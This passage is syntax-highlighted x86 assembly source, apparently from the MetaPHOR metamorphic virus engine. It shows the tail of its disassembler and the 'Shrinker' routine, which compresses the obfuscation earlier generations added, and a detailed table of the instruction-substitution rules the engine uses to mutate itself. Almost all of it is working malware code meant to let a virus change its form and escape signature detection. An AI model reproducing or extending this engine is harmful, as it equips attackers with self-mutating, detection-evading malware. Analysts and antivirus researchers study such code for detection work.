                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Set BYTE addition length, get the </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; addition BYTE, extend the sign of </span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; it and store it</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@SetAddition2</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
      </span><span class="sc5">@@SetAddition2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Store the addition and return</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

      </span><span class="sc5">@@EBPMeansDwordAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the low register at 3rd opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">          </span><span class="sc1">; Check if it's EBP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DwordAddition2</span><span class="sc0">  </span><span class="sc1">; If it isn't, jump to decode only the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; addition (EBP is a special case in</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; this case)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; If not, set the index register at</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; the first slot of the index position</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; in the memory reference structure</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; and return.</span><span class="sc0">
</span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; End of the disassembler</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;; KEYWORD: Key_!Shrinker</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;; *********************************************************************** ;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The Shrinker</span><span class="sc0">
</span><span class="sc1">;; ------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Required parameters:</span><span class="sc0">
</span><span class="sc1">;; [InstructionTable] = Pointer to first instruction in instruction table</span><span class="sc0">
</span><span class="sc1">;; [AddressOfLastInstruction] = The limit of the disassembly</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; This function will eliminate all the obfuscation done by the expander in</span><span class="sc0">
</span><span class="sc1">;; previous generations. The compression is made by single instructions, pairs</span><span class="sc0">
</span><span class="sc1">;; or triplets. The work is performed in the pseudo-ASM the disassembler</span><span class="sc0">
</span><span class="sc1">;; generated, so the modifications are easier.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The single, pairs and triplets scanned are the following (extracted from</span><span class="sc0">
</span><span class="sc1">;; the article I wrote about this engine):</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  Legend:</span><span class="sc0">
</span><span class="sc1">;;  Reg: A register</span><span class="sc0">
</span><span class="sc1">;;  Mem: A memory address</span><span class="sc0">
</span><span class="sc1">;;  Imm: Immediate</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  When in an instruction is Reg,Reg or something like that, both are the</span><span class="sc0">
</span><span class="sc1">;;  same register. If they are different, I write it as Reg,Reg2 (for example).</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  Transformations over single instructions:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   XOR Reg,-1               --&gt; NOT Reg</span><span class="sc0">
</span><span class="sc1">;;   XOR Mem,-1               --&gt; NOT Mem</span><span class="sc0">
</span><span class="sc1">;;   MOV Reg,Reg              --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   SUB Reg,Imm              --&gt; ADD Reg,-Imm</span><span class="sc0">
</span><span class="sc1">;;   SUB Mem,Imm              --&gt; ADD Mem,-Imm</span><span class="sc0">
</span><span class="sc1">;;   XOR Reg,0                --&gt; MOV Reg,0</span><span class="sc0">
</span><span class="sc1">;;   XOR Mem,0                --&gt; MOV Mem,0</span><span class="sc0">
</span><span class="sc1">;;   ADD Reg,0                --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   ADD Mem,0                --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   OR  Reg,0                --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   OR  Mem,0                --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   AND Reg,-1               --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   AND Mem,-1               --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   AND Reg,0                --&gt; MOV Reg,0</span><span class="sc0">
</span><span class="sc1">;;   AND Mem,0                --&gt; MOV Mem,0</span><span class="sc0">
</span><span class="sc1">;;   XOR Reg,Reg              --&gt; MOV Reg,0</span><span class="sc0">
</span><span class="sc1">;;   SUB Reg,Reg              --&gt; MOV Reg,0</span><span class="sc0">
</span><span class="sc1">;;   OR  Reg,Reg              --&gt; CMP Reg,0</span><span class="sc0">
</span><span class="sc1">;;   AND Reg,Reg              --&gt; CMP Reg,0</span><span class="sc0">
</span><span class="sc1">;;   TEST Reg,Reg             --&gt; CMP Reg,0</span><span class="sc0">
</span><span class="sc1">;;   LEA Reg,[Imm]            --&gt; MOV Reg,Imm</span><span class="sc0">
</span><span class="sc1">;;   LEA Reg,[Reg+Imm]        --&gt; ADD Reg,Imm</span><span class="sc0">
</span><span class="sc1">;;   LEA Reg,[Reg2]           --&gt; MOV Reg,Reg2</span><span class="sc0">
</span><span class="sc1">;;   LEA Reg,[Reg+Reg2]       --&gt; ADD Reg,Reg2</span><span class="sc0">
</span><span class="sc1">;;   LEA Reg,[Reg2+Reg2+xxx]  --&gt; LEA Reg,[2*Reg2+xxx]</span><span class="sc0">
</span><span class="sc1">;;   MOV Reg,Reg              --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Mem              --&gt; NOP (result of a compression of</span><span class="sc0">
</span><span class="sc1">;;                                     PUSH Mem/POP Mem, with pseudoopcode 4F)</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The instructions that are eliminated (the ones that mean NOP) are be used</span><span class="sc0">
</span><span class="sc1">;; as garbage along the executable code. Since every NOP instruction can be</span><span class="sc0">
</span><span class="sc1">;; expanded (for example, MOV Reg,Reg can be set as PUSH Reg/POP Reg, and every</span><span class="sc0">
</span><span class="sc1">;; PUSH and POP also can be expanded, and so on) you can't know what's garbage</span><span class="sc0">
</span><span class="sc1">;; and what's not until you have compressed everything.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The pairs of instructions that MetaPHOR can compress are:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   PUSH Imm / POP Reg                      --&gt; MOV Reg,Imm</span><span class="sc0">
</span><span class="sc1">;;   PUSH Imm / POP Mem                      --&gt; MOV Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;   PUSH Reg / POP Reg2                     --&gt; MOV Reg2,Reg</span><span class="sc0">
</span><span class="sc1">;;   PUSH Reg / POP Mem                      --&gt; MOV Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;   PUSH Mem / POP Reg                      --&gt; MOV Reg,Mem</span><span class="sc0">
</span><span class="sc1">;;   PUSH Mem / POP Mem2                     --&gt; MOV Mem2,Mem (codificated</span><span class="sc0">
</span><span class="sc1">;;                                                with pseudoopcode 4F)</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg/PUSH Mem                    --&gt; PUSH Reg</span><span class="sc0">
</span><span class="sc1">;;   POP Mem / MOV Reg,Mem                   --&gt; POP Reg</span><span class="sc0">
</span><span class="sc1">;;   POP Mem2 / MOV Mem,Mem2                 --&gt; POP Mem</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg / MOV Reg2,Mem              --&gt; MOV Reg2,Reg</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Imm / PUSH Mem                  --&gt; PUSH Imm</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Imm / OP Reg,Mem                --&gt; OP Reg,Imm</span><span class="sc0">
</span><span class="sc1">;;   MOV Reg,Imm / ADD Reg,Reg2              --&gt; LEA Reg,[Reg2+Imm]</span><span class="sc0">
</span><span class="sc1">;;   MOV Reg,Reg2 / ADD Reg,Imm              --&gt; LEA Reg,[Reg2+Imm]</span><span class="sc0">
</span><span class="sc1">;;   MOV Reg,Reg2 / ADD Reg,Reg3             --&gt; LEA Reg,[Reg2+Reg3]</span><span class="sc0">
</span><span class="sc1">;;   ADD Reg,Imm / ADD Reg,Reg2              --&gt; LEA Reg,[Reg+Reg2+Imm]</span><span class="sc0">
</span><span class="sc1">;;   ADD Reg,Reg2 / ADD Reg,Imm              --&gt; LEA Reg,[Reg+Reg2+Imm]</span><span class="sc0">
</span><span class="sc1">;;   OP Reg,Imm / OP Reg,Imm2                --&gt; OP Reg,(Imm OP Imm2)</span><span class="sc0">
</span><span class="sc1">;;                                                (must be calculated)</span><span class="sc0">
</span><span class="sc1">;;   OP Mem,Imm / OP Mem,Imm2                --&gt; OP Mem,(Imm OP Imm2)</span><span class="sc0">
</span><span class="sc1">;;                                                (must be calculated)</span><span class="sc0">
</span><span class="sc1">;;   LEA Reg,[Reg2+Imm] / ADD Reg,Reg3       --&gt; LEA Reg,[Reg2+Reg3+Imm]</span><span class="sc0">
</span><span class="sc1">;;   LEA Reg,[(RegX+)Reg2+Imm] / ADD Reg,Reg2 -&gt; LEA Reg,[(RegX+)2*Reg2+Imm]</span><span class="sc0">
</span><span class="sc1">;;   POP Mem / PUSH Mem                      --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem / MOV Mem3,Mem2            --&gt; MOV Mem3,Mem</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem / OP Reg,Mem2              --&gt; OP Reg,Mem</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem / MOV Mem2,xxx             --&gt; MOV Mem2,xxx</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg / CALL Mem                  --&gt; CALL Reg</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg / JMP Mem                   --&gt; JMP Reg</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem / CALL Mem2                --&gt; CALL Mem</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem / JMP Mem2                 --&gt; JMP Mem</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg / MOV Mem2,Mem              --&gt; MOV Mem2,Reg</span><span class="sc0">
</span><span class="sc1">;;   OP Reg,xxx / MOV Reg,yyy                --&gt; MOV Reg,yyy</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx / !Jcc @xxx                    --&gt; JMP @xxx (this applies to</span><span class="sc0">
</span><span class="sc1">;;                                                (Jcc &amp; 0FEh) with (Jcc | 1)</span><span class="sc0">
</span><span class="sc1">;;   NOT Reg / NEG Reg                       --&gt; ADD Reg,1</span><span class="sc0">
</span><span class="sc1">;;   NOT Reg / ADD Reg,1                     --&gt; NEG Reg</span><span class="sc0">
</span><span class="sc1">;;   NOT Mem / NEG Mem                       --&gt; ADD Mem,1</span><span class="sc0">
</span><span class="sc1">;;   NOT Mem / ADD Mem,1                     --&gt; NEG Mem</span><span class="sc0">
</span><span class="sc1">;;   NEG Reg / NOT Reg                       --&gt; ADD Reg,-1</span><span class="sc0">
</span><span class="sc1">;;   NEG Reg / ADD Reg,-1                    --&gt; NOT Reg</span><span class="sc0">
</span><span class="sc1">;;   NEG Mem / NOT Mem                       --&gt; ADD Mem,-1</span><span class="sc0">
</span><span class="sc1">;;   NEG Mem / ADD Mem,-1                    --&gt; NOT Mem</span><span class="sc0">
</span><span class="sc1">;;   CMP X,Y / != Jcc (CMP without Jcc)      --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   TEST X,Y / != Jcc                       --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;   POP Mem / JMP Mem                       --&gt; RET</span><span class="sc0">
</span><span class="sc1">;;   PUSH Reg / RET                          --&gt; JMP Reg</span><span class="sc0">
</span><span class="sc1">;;   CALL Mem / MOV Mem2,EAX                 --&gt; CALL Mem / APICALL_STORE Mem2</span><span class="sc0">
</span><span class="sc1">;;   MOV Reg,Mem / CALL Reg                  --&gt; CALL Mem</span><span class="sc0">
</span><span class="sc1">;;   XOR Reg,Reg / MOV Reg8,[Mem]            --&gt; MOVZX Reg,byte ptr [Mem]</span><span class="sc0">
</span><span class="sc1">;;   MOV Reg,[Mem] / AND Reg,0FFh            --&gt; MOVZX Reg,byte ptr [Mem]</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Maybe there are more, but this set is sufficient, at least for our</span><span class="sc0">
</span><span class="sc1">;; proposits. What we do know is scan the code for this situations and then we</span><span class="sc0">
</span><span class="sc1">;; substitute the first instruction by their equivalent and we overwrite with</span><span class="sc0">
</span><span class="sc1">;; NOP the second, so the instructions are compressed.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; But there are more: the triplets:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;   OP Mem,Reg2</span><span class="sc0">
</span><span class="sc1">;;   MOV Reg,Mem                     --&gt; OP Reg,Reg2</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;   OP Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;   MOV Reg,Mem                     --&gt; OP Reg,Imm</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;   OP Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;   MOV Reg,Mem                     --&gt; OP Reg,Imm (it can't be SUB)</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem</span><span class="sc0">
</span><span class="sc1">;;   OP Mem2,Reg</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Mem2                    --&gt; OP Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem</span><span class="sc0">
</span><span class="sc1">;;   OP Mem2,Imm</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Mem2                    --&gt; OP Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   CMP Reg,Reg</span><span class="sc0">
</span><span class="sc1">;;   JO/JB/JNZ/JA/JS/JNP/JL/JG @xxx</span><span class="sc0">
</span><span class="sc1">;;   != Jcc                          --&gt; NOP</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   CMP Reg,Reg</span><span class="sc0">
</span><span class="sc1">;;   JNO/JAE/JZ/JBE/JNS/JP/JGE/JLE @xxx</span><span class="sc0">
</span><span class="sc1">;;   != Jcc                          --&gt; JMP @xxx</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;   CMP/TEST Reg,Mem</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx                        --&gt; CMP/TEST Reg,Imm</span><span class="sc0">
</span><span class="sc1">;;                                       Jcc @xxx</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;   SUB/CMP Mem,Reg2</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx                        --&gt; CMP Reg,Reg2</span><span class="sc0">
</span><span class="sc1">;;                                       Jcc @xxx</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;   AND/TEST Mem,Reg2</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx                        --&gt; TEST Reg,Reg2</span><span class="sc0">
</span><span class="sc1">;;                                       Jcc @xxx</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;   SUB/CMP Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx                        --&gt; CMP Reg,Imm</span><span class="sc0">
</span><span class="sc1">;;                                       Jcc @xxx</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;   AND/TEST Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx                        --&gt; TEST Reg,Imm</span><span class="sc0">
</span><span class="sc1">;;                                       Jcc @xxx</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem</span><span class="sc0">
</span><span class="sc1">;;   CMP/TEST Reg,Mem2</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx                        --&gt; CMP/TEST Reg,Mem</span><span class="sc0">
</span><span class="sc1">;;                                       Jcc @xxx</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem</span><span class="sc0">
</span><span class="sc1">;;   AND/TEST Mem2,Reg</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx                        --&gt; TEST Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;                                       Jcc @xxx</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem</span><span class="sc0">
</span><span class="sc1">;;   SUB/CMP Mem2,Reg</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx                        --&gt; CMP Mem,Reg</span><span class="sc0">
</span><span class="sc1">;;                                       Jcc @xxx</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem</span><span class="sc0">
</span><span class="sc1">;;   AND/TEST Mem2,Imm</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx                        --&gt; TEST Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;                                       Jcc @xxx</span><span class="sc0">
</span><span class="sc1">;;   MOV Mem2,Mem</span><span class="sc0">
</span><span class="sc1">;;   SUB/CMP Mem2,Imm</span><span class="sc0">
</span><span class="sc1">;;   Jcc @xxx                        --&gt; CMP Mem,Imm</span><span class="sc0">
</span><span class="sc1">;;                                       Jcc @xxx</span><span class="sc0">
</span><span class="sc1">;;   PUSH EAX</span><span class="sc0">
</span><span class="sc1">;;   PUSH ECX</span><span class="sc0">
</span><span class="sc1">;;   PUSH EDX                        --&gt; APICALL_BEGIN</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;   POP EDX</span><span class="sc0">
</span><span class="sc1">;;   POP ECX</span><span class="sc0">
</span><span class="sc1">;;   POP EAX                         --&gt; APICALL_END</span><span class="sc0">
</span><span class="sc1">;;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; ShrinkCode acts over the disassembled buffer in [InstructionTable].</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">ShrinkCode</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">   </span><span class="sc1">; Get pseudo-opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckIfInstructionUsesMem</span><span class="sc0"> </span><span class="sc1">; Uses a memory address?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Shrink</span><span class="sc0">      </span><span class="sc1">; If not, continue</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OrderRegs</span><span class="sc0">   </span><span class="sc1">; Order the indexes of the instruction</span><span class="sc0">
                                    </span><span class="sc1">; from lower to upper</span><span class="sc0">
    </span><span class="sc5">@@Shrink</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">   </span><span class="sc1">; Get pseudo-op</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">   </span><span class="sc1">; Is it NOP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@IncreaseEIP</span><span class="sc0"> </span><span class="sc1">; If so, increase pointer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShrinkThisInstructions</span><span class="sc0"> </span><span class="sc1">; Check for singles, pairs or</span><span class="sc0">
                                               </span><span class="sc1">; triplets</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Do we performed a compression?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@IncreaseEIP</span><span class="sc0"> </span><span class="sc1">; If we don't, increase pointer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecreaseEIP</span><span class="sc0"> </span><span class="sc1">; Decrease the pointer three instructions</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecreaseEIP</span><span class="sc0"> </span><span class="sc1">; to get a possible matching group with</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecreaseEIP</span><span class="sc0"> </span><span class="sc1">; the two above.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Shrink</span><span class="sc0">      </span><span class="sc1">; Check again</span><span class="sc0">

    </span><span class="sc5">@@IncreaseEIP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncreaseEIP</span><span class="sc0">                         </span><span class="sc1">; Increase pointer</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Last instruction?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Shrink</span><span class="sc0">                       </span><span class="sc1">; If not, check next group</span><span class="sc0">

    </span><span class="sc5">@@DecreaseAddressOfLastInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">        </span><span class="sc1">; Now we eliminate the remaining NOPs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; at the end of all the instructions.</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LastInstructionOK</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@DecreaseAddressOfLastInstruction</span><span class="sc0">
    </span><span class="sc5">@@LastInstructionOK</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">;; Second pass to find APICALL_BEGIN, APICALL_END and SET_WEIGHT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc5">@@FindAPICALL_X</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@@GetFirstInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncreaseEIP2</span><span class="sc0"> </span><span class="sc1">; Increase pointer</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; End of instruction table?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndOfScan</span><span class="sc0">    </span><span class="sc1">; If so, finish the search</span><span class="sc0">

